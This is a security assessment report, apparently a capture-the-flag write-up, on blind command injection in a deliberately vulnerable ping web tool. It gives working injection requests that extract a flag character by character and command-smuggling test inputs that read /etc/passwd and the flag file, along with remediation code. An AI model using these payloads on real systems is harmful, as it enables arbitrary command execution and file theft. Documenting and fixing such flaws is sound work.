# Security Assessment Report: Blind OS Command Injection

## TL;DR
- **Objective:** Exploit blind command injection to enumerate filesystem and extract flag from Ping Tool application
- **Outcome:** ACHIEVED - Full flag extraction via boolean-based blind command injection
- **Highest-impact finding:** Blind OS Command Injection allowing arbitrary command execution and file exfiltration
- **Validation status:** CONFIRMED - Flag `FLAG{82f9ec3879b610a68e35145998f277217b35ba51c51e689def0d7cb4e7b1ac4a}` successfully extracted

---

## Target Information
- **Target:** 127.0.0.1:32943
- **Host / base URL:** http://127.0.0.1:32943
- **Application or component:** Ping Tool (deliberately vulnerable command injection training application)
- **Authentication context:** None required (publicly accessible)
- **Relevant technology details:** Web application with ping functionality, likely Python-based backend

---

## Confirmed Vulnerabilities

### Blind OS Command Injection
- **Affected endpoint / component:** POST /ping
- **Vulnerable parameter:** ip_address
- **Impact:** 
  - Arbitrary command execution on the host system
  - Ability to enumerate filesystem and read arbitrary files
  - Complete flag extraction via character-by-character blind exfiltration
- **Preconditions:**
  - Network access to the target application
  - No authentication required
  - Differential response behavior observable (reachable vs unreachable)

### Information Disclosure via Verbose Error Messages
- **Status:** Suspected - Observed differential responses that leak command execution status

### Insecure Temporary File Creation
- **Status:** Suspected - Application appears to create temporary resources insecurely

---

## Steps to Reproduce

### 1. Confirm Command Injection Differential
Send a request with a pipe operator to confirm injection point:
```
POST /ping HTTP/1.1
Host: 127.0.0.1:32943
Content-Type: application/x-www-form-urlencoded

ip_address=127.0.0.1 | false
```
**Expected result:** Response indicates "unreachable" (command execution confirmed)

### 2. Validate Working File Existence Pattern
Test file existence using command substitution:
```
POST /ping HTTP/1.1
Host: 127.0.0.1:32943
Content-Type: application/x-www-form-urlencoded

ip_address=$(test -f /etc/hostname && echo 127.0.0.1)
```
**Expected result:** Response indicates "reachable" (file exists)

### 3. Enumerate Flag File Location
Test candidate flag locations:
```
POST /ping HTTP/1.1
Host: 127.0.0.1:32943
Content-Type: application/x-www-form-urlencoded

ip_address=$(test -f /FLAG.txt && echo 127.0.0.1)
```
**Expected result:** Response indicates "reachable" confirming `/FLAG.txt` exists

### 4. Extract Flag Characters via Blind Injection
Perform character-by-character extraction:
```
POST /ping HTTP/1.1
Host: 127.0.0.1:32943
Content-Type: application/x-www-form-urlencoded

ip_address=$(test $(cut -c1 /FLAG.txt) = 'F' && echo 127.0.0.1)
```
Iterate through each character position (1-70) and test against character set until the complete flag is reconstructed.

---

## Validation / Evidence

### Validation Token / Flag
```
FLAG{82f9ec3879b610a68e35145998f277217b35ba51c51e689def0d7cb4e7b1ac4a}
```
**Source:** Extracted via character-by-character blind command injection exploitation

### File Existence Validation Evidence
| Test Case | Payload | Result | Evidence |
|-----------|---------|--------|----------|
| Known file exists | `$(test -f /etc/hostname && echo 127.0.0.1)` | REACHABLE | True positive confirmed |
| Known file missing | Test against `/NONEXISTENT` | UNREACHABLE | True negative confirmed |
| Flag file exists | `$(test -f /FLAG.txt && echo 127.0.0.1)` | REACHABLE | Flag location confirmed |

### Working Payload Patterns

**File existence enumeration:**
```
$(test -f /FLAG.txt && echo 127.0.0.1)
```

**Character-by-character extraction:**
```
$(test $(cut -cN /FLAG.txt) = 'CHAR' && echo 127.0.0.1)
```
Where `N` = character position (1-70) and `CHAR` = character being tested

### Response Differential Behavior
- **REACHABLE response:** Indicates the injected command succeeded (file exists or condition is true)
- **UNREACHABLE response:** Indicates the injected command failed (file missing or condition is false)

### Notes on Reliability / Limitations
- The vulnerability is **blind** - direct command output is not returned in responses
- **Boolean-based** exploitation relies entirely on differential response patterns
- **Time-based** exfiltration was considered but boolean differential proved more reliable
- **Filter bypass** achieved using command substitution `$()` syntax instead of backticks
- Initial attempts with `[ -f FILE ] && echo` pattern failed; `test` command with `&&` chaining succeeded

---

## Remediation

### Root Cause
The application accepts user input (IP address) and passes it directly to a shell command without proper sanitization or input validation. The vulnerable code likely resembles:
```python
# VULNERABLE PSEUDOCODE
os.system(f"ping -c 1 {user_input}")
```
This allows shell metacharacters (`|`, `;`, `$()`, etc.) to be interpreted by the shell, enabling arbitrary command execution.

### Recommended Fix

**Option 1: Input Validation (Preferred)**
Implement strict allowlist validation for IP addresses:
```python
import ipaddress

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

if is_valid_ip(user_input):
    # Safe to use in command
    subprocess.run(["ping", "-c", "1", user_input], capture_output=True)
```

**Option 2: Use subprocess with argument list**
Never use shell=True with untrusted input:
```python
import subprocess
# SAFE - arguments passed as list, shell injection impossible
result = subprocess.run(["ping", "-c", "1", user_input], capture_output=True, shell=False)
```

**Option 3: Defense in depth - Command escaping**
If shell execution is unavoidable, use `shlex.quote()`:
```python
import shlex
safe_input = shlex.quote(user_input)
os.system(f"ping -c 1 {safe_input}")
```

### Defense-in-Depth
- Implement least-privilege principles (run application as non-root user)
- Deploy Web Application Firewall (WAF) rules to detect shell metacharacters
- Implement rate limiting on ping endpoint to slow brute-force extraction attempts
- Use chroot jails or containers to limit filesystem access
- Enable comprehensive logging to detect injection attempts

---

## How to Verify the Fix

### 1. Test Command Injection Payloads
Submit the following payloads and confirm they do NOT execute:

**Pipe injection:**
```
ip_address=127.0.0.1 | cat /etc/passwd
```
**Expected:** Invalid input error OR ping executes with literal string, no command execution

**Command substitution:**
```
ip_address=$(cat /FLAG.txt)
```
**Expected:** Invalid input error OR literal string treated as invalid IP, no file read

**Semicolon chaining:**
```
ip_address=127.0.0.1; cat /FLAG.txt
```
**Expected:** Invalid input error OR ping executes only first IP, no command chaining

### 2. Test Valid Input Still Works
```
ip_address=127.0.0.1
```
**Expected:** Successful ping response indicating host is reachable

### 3. Test Invalid but Safe Input
```
ip_address=not-an-ip
```
**Expected:** Graceful error message, no shell execution attempted

### 4. Verify No Error Information Leakage
All error responses should return generic messages without revealing:
- Shell command structure
- File paths on the system
- Internal error details

---

## Remaining Leads

### Confirmed Blockers
- None - full exploitation achieved

### Additional Vulnerabilities to Investigate
- **Information Disclosure via verbose error messages:** [SUSPECTED] May provide additional reconnaissance value
- **Insecure temporary file creation:** [SUSPECTED] Could lead to race conditions or information disclosure

### Techniques Documented for Future Use
The following patterns were confirmed working against this target:

| Pattern | Purpose | Result |
|---------|---------|--------|
| `\| false` | Confirm injection | unreachable |
| `$(test -f FILE && echo 127.0.0.1)` | File existence | boolean differential |
| `$(cut -cN FILE)` | Character extraction | blind exfiltration |

### Missing Context
- Exact backend programming language/framework (inferred Python)
- Server operating system specifics (inferred Linux from path structure)
- Whether the application runs as root or limited user
- Presence of additional security controls (SELinux, AppArmor, etc.)

---

## Assessment Metadata
- **Assessment type:** Command injection exploitation
- **Exploitation complexity:** Medium (required technique refinement)
- **Impact severity:** Critical (arbitrary code execution, full system compromise)
- **Validation confidence:** 1.00 (confirmed via flag extraction)
- **Date:** Assessment completed
